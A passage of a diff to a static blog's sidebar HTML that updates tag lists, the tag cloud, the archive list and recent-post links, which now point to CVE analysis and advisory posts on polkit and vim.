href="/tags/dbus%E6%9C%8D%E5%8A%A1%E8%87%AA%E5%90%AF%E5%8A%A8/" rel="tag">dbus服务自启动</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/dd/" rel="tag">dd</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ext4/" rel="tag">ext4</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/gvm/" rel="tag">gvm</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/json/" rel="tag">json</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/metadata-csum/" rel="tag">metadata_csum</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/nfs/" rel="tag">nfs</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/nginx-conf/" rel="tag">nginx.conf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/openstack/" rel="tag">openstack</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/openstack%E9%80%82%E9%85%8D/" rel="tag">openstack适配</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/openvas/" rel="tag">openvas</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/polkit/" rel="tag">polkit</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/qt/" rel="tag">qt</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/review/" rel="tag">review</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/share/" rel="tag">share</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sudo/" rel="tag">sudo</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tip/" rel="tag">tip</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ussuri/" rel="tag">ussuri</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/vsftpd/" rel="tag">vsftpd</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/watch/" rel="tag">watch</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wget/" rel="tag">wget</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/" rel="tag">分析报告</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%90%84%E4%B8%AA%E6%A8%A1%E5%9D%97%E4%BB%8B%E7%BB%8D/" rel="tag">各个模块介绍</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/" rel="tag">安全公告</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%AC%AC%E4%B8%80%E5%91%A8/" rel="tag">第一周</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%AC%AC%E4%B8%89%E5%91%A8/" rel="tag">第三周</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%AC%AC%E4%BA%8C%E5%91%A8/" rel="tag">第二周</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%AC%AC%E4%BA%94%E5%91%A8/" rel="tag">第五周</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%AC%AC%E5%9B%9B%E5%91%A8/" rel="tag">第四周</a></li></ul>
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Algorithm/" rel="tag">Algorithm</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/c/" rel="tag">c</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/c-demo%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E/" rel="tag">c demo使用说明</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cockpit/" rel="tag">cockpit</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cockpit-DBus-Client/" rel="tag">cockpit.DBus Client</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cockpit-js/" rel="tag">cockpit.js</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cockpit%E6%95%B0%E6%8D%AE%E6%A0%BC%E5%BC%8F/" rel="tag">cockpit数据格式</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cockpit%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/" rel="tag">cockpit文件操作</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/configobj/" rel="tag">configobj</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cve/" rel="tag">cve</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/dbus/" rel="tag">dbus</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/dbus%E6%9C%8D%E5%8A%A1%E8%87%AA%E5%90%AF%E5%8A%A8/" rel="tag">dbus服务自启动</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/dd/" rel="tag">dd</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ext4/" rel="tag">ext4</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/gvm/" rel="tag">gvm</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/json/" rel="tag">json</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/metadata-csum/" rel="tag">metadata_csum</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/nfs/" rel="tag">nfs</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/nginx-conf/" rel="tag">nginx.conf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/openstack/" rel="tag">openstack</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/openstack%E9%80%82%E9%85%8D/" rel="tag">openstack适配</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/openvas/" rel="tag">openvas</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/policykit/" rel="tag">policykit</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/polkit/" rel="tag">polkit</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/qt/" rel="tag">qt</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/review/" rel="tag">review</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/share/" rel="tag">share</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sudo/" rel="tag">sudo</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tip/" rel="tag">tip</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ussuri/" rel="tag">ussuri</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/vim/" rel="tag">vim</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/vsftpd/" rel="tag">vsftpd</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/watch/" rel="tag">watch</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wget/" rel="tag">wget</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/" rel="tag">分析报告</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%90%84%E4%B8%AA%E6%A8%A1%E5%9D%97%E4%BB%8B%E7%BB%8D/" rel="tag">各个模块介绍</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/" rel="tag">安全公告</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="tag">漏洞分析</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%AC%AC%E4%B8%80%E5%91%A8/" rel="tag">第一周</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%AC%AC%E4%B8%89%E5%91%A8/" rel="tag">第三周</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%AC%AC%E4%BA%8C%E5%91%A8/" rel="tag">第二周</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%AC%AC%E4%BA%94%E5%91%A8/" rel="tag">第五周</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%AC%AC%E5%9B%9B%E5%91%A8/" rel="tag">第四周</a></li></ul>
     </div>
   </div>
 
@@ -521,7 +737,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Tag Cloud</h3>
     <div class="widget tagcloud">
-      <a href="/tags/Algorithm/" style="font-size: 15.71px;">Algorithm</a> <a href="/tags/c/" style="font-size: 10px;">c</a> <a href="/tags/c-demo%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E/" style="font-size: 10px;">c demo使用说明</a> <a href="/tags/cockpit/" style="font-size: 17.14px;">cockpit</a> <a href="/tags/cockpit-DBus-Client/" style="font-size: 10px;">cockpit.DBus Client</a> <a href="/tags/cockpit-js/" style="font-size: 10px;">cockpit.js</a> <a href="/tags/cockpit%E6%95%B0%E6%8D%AE%E6%A0%BC%E5%BC%8F/" style="font-size: 10px;">cockpit数据格式</a> <a href="/tags/cockpit%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/" style="font-size: 10px;">cockpit文件操作</a> <a href="/tags/configobj/" style="font-size: 10px;">configobj</a> <a href="/tags/cve/" style="font-size: 20px;">cve</a> <a href="/tags/dbus/" style="font-size: 11.43px;">dbus</a> <a href="/tags/dbus%E6%9C%8D%E5%8A%A1%E8%87%AA%E5%90%AF%E5%8A%A8/" style="font-size: 10px;">dbus服务自启动</a> <a href="/tags/dd/" style="font-size: 10px;">dd</a> <a href="/tags/ext4/" style="font-size: 10px;">ext4</a> <a href="/tags/gvm/" style="font-size: 10px;">gvm</a> <a href="/tags/json/" style="font-size: 10px;">json</a> <a href="/tags/metadata-csum/" style="font-size: 10px;">metadata_csum</a> <a href="/tags/nfs/" style="font-size: 10px;">nfs</a> <a href="/tags/nginx-conf/" style="font-size: 10px;">nginx.conf</a> <a href="/tags/openstack/" style="font-size: 12.86px;">openstack</a> <a href="/tags/openstack%E9%80%82%E9%85%8D/" style="font-size: 10px;">openstack适配</a> <a href="/tags/openvas/" style="font-size: 10px;">openvas</a> <a href="/tags/polkit/" style="font-size: 10px;">polkit</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/qt/" style="font-size: 10px;">qt</a> <a href="/tags/review/" style="font-size: 15.71px;">review</a> <a href="/tags/share/" style="font-size: 14.29px;">share</a> <a href="/tags/sudo/" style="font-size: 14.29px;">sudo</a> <a href="/tags/tip/" style="font-size: 15.71px;">tip</a> <a href="/tags/ussuri/" style="font-size: 10px;">ussuri</a> <a href="/tags/vsftpd/" style="font-size: 10px;">vsftpd</a> <a href="/tags/watch/" style="font-size: 10px;">watch</a> <a href="/tags/wget/" style="font-size: 12.86px;">wget</a> <a href="/tags/%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/" style="font-size: 10px;">分析报告</a> <a href="/tags/%E5%90%84%E4%B8%AA%E6%A8%A1%E5%9D%97%E4%BB%8B%E7%BB%8D/" style="font-size: 10px;">各个模块介绍</a> <a href="/tags/%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/" style="font-size: 18.57px;">安全公告</a> <a href="/tags/%E7%AC%AC%E4%B8%80%E5%91%A8/" style="font-size: 14.29px;">第一周</a> <a href="/tags/%E7%AC%AC%E4%B8%89%E5%91%A8/" style="font-size: 14.29px;">第三周</a> <a href="/tags/%E7%AC%AC%E4%BA%8C%E5%91%A8/" style="font-size: 14.29px;">第二周</a> <a href="/tags/%E7%AC%AC%E4%BA%94%E5%91%A8/" style="font-size: 12.86px;">第五周</a> <a href="/tags/%E7%AC%AC%E5%9B%9B%E5%91%A8/" style="font-size: 14.29px;">第四周</a>
+      <a href="/tags/Algorithm/" style="font-size: 15.71px;">Algorithm</a> <a href="/tags/c/" style="font-size: 10px;">c</a> <a href="/tags/c-demo%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E/" style="font-size: 10px;">c demo使用说明</a> <a href="/tags/cockpit/" style="font-size: 17.14px;">cockpit</a> <a href="/tags/cockpit-DBus-Client/" style="font-size: 10px;">cockpit.DBus Client</a> <a href="/tags/cockpit-js/" style="font-size: 10px;">cockpit.js</a> <a href="/tags/cockpit%E6%95%B0%E6%8D%AE%E6%A0%BC%E5%BC%8F/" style="font-size: 10px;">cockpit数据格式</a> <a href="/tags/cockpit%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/" style="font-size: 10px;">cockpit文件操作</a> <a href="/tags/configobj/" style="font-size: 10px;">configobj</a> <a href="/tags/cve/" style="font-size: 20px;">cve</a> <a href="/tags/dbus/" style="font-size: 11.43px;">dbus</a> <a href="/tags/dbus%E6%9C%8D%E5%8A%A1%E8%87%AA%E5%90%AF%E5%8A%A8/" style="font-size: 10px;">dbus服务自启动</a> <a href="/tags/dd/" style="font-size: 10px;">dd</a> <a href="/tags/ext4/" style="font-size: 10px;">ext4</a> <a href="/tags/gvm/" style="font-size: 10px;">gvm</a> <a href="/tags/json/" style="font-size: 10px;">json</a> <a href="/tags/metadata-csum/" style="font-size: 10px;">metadata_csum</a> <a href="/tags/nfs/" style="font-size: 10px;">nfs</a> <a href="/tags/nginx-conf/" style="font-size: 10px;">nginx.conf</a> <a href="/tags/openstack/" style="font-size: 12.86px;">openstack</a> <a href="/tags/openstack%E9%80%82%E9%85%8D/" style="font-size: 10px;">openstack适配</a> <a href="/tags/openvas/" style="font-size: 10px;">openvas</a> <a href="/tags/policykit/" style="font-size: 10px;">policykit</a> <a href="/tags/polkit/" style="font-size: 10px;">polkit</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/qt/" style="font-size: 10px;">qt</a> <a href="/tags/review/" style="font-size: 15.71px;">review</a> <a href="/tags/share/" style="font-size: 14.29px;">share</a> <a href="/tags/sudo/" style="font-size: 14.29px;">sudo</a> <a href="/tags/tip/" style="font-size: 15.71px;">tip</a> <a href="/tags/ussuri/" style="font-size: 10px;">ussuri</a> <a href="/tags/vim/" style="font-size: 17.14px;">vim</a> <a href="/tags/vsftpd/" style="font-size: 10px;">vsftpd</a> <a href="/tags/watch/" style="font-size: 10px;">watch</a> <a href="/tags/wget/" style="font-size: 12.86px;">wget</a> <a href="/tags/%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/" style="font-size: 10px;">分析报告</a> <a href="/tags/%E5%90%84%E4%B8%AA%E6%A8%A1%E5%9D%97%E4%BB%8B%E7%BB%8D/" style="font-size: 10px;">各个模块介绍</a> <a href="/tags/%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/" style="font-size: 18.57px;">安全公告</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" style="font-size: 10px;">漏洞分析</a> <a href="/tags/%E7%AC%AC%E4%B8%80%E5%91%A8/" style="font-size: 14.29px;">第一周</a> <a href="/tags/%E7%AC%AC%E4%B8%89%E5%91%A8/" style="font-size: 14.29px;">第三周</a> <a href="/tags/%E7%AC%AC%E4%BA%8C%E5%91%A8/" style="font-size: 14.29px;">第二周</a> <a href="/tags/%E7%AC%AC%E4%BA%94%E5%91%A8/" style="font-size: 12.86px;">第五周</a> <a href="/tags/%E7%AC%AC%E5%9B%9B%E5%91%A8/" style="font-size: 14.29px;">第四周</a>
     </div>
   </div>
 
@@ -530,7 +746,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/03/">March 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/02/">February 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">January 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">November 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">July 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">April 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">March 2019</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/03/">March 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/02/">February 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">January 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">November 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">April 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">March 2019</a></li></ul>
     </div>
   </div>
 
@@ -543,23 +759,23 @@
       <ul>
         
           <li>
-            <a href="/2022/03/10/cve-2021-3156%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/">cve-2021-3156安全公告</a>
+            <a href="/2022/03/24/CVE-2021-4034%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/">CVE-2021-4034分析报告</a>
           </li>
         
           <li>
-            <a href="/2022/03/10/cve-2019-18634%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/">cve-2019-18634分析报告</a>
+            <a href="/2022/03/23/CVE-2022-0318%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/">CVE-2022-0318安全公告</a>
           </li>
         
           <li>
-            <a href="/2022/03/10/cve-2019-14287%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/">cve-2019-14287分析报告</a>
+            <a href="/2022/03/23/CVE-2022-0261%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/">CVE-2022-0261安全公告</a>
           </li>
         
           <li>
-            <a href="/2022/03/10/cve-2017-1000368%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/">cve-2017-1000368分析报告</a>
+            <a href="/2022/03/23/CVE-2022-0213%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/">CVE-2022-0213安全公告</a>
           </li>
         
           <li>
-            <a href="/2022/03/10/cve-2017-1000367%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/">cve-2017-1000367分析报告</a>
+            <a href="/2022/03/23/CVE-2021-4193%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/">CVE-2021-4193安全公告</a>
           </li>
         
       </ul>
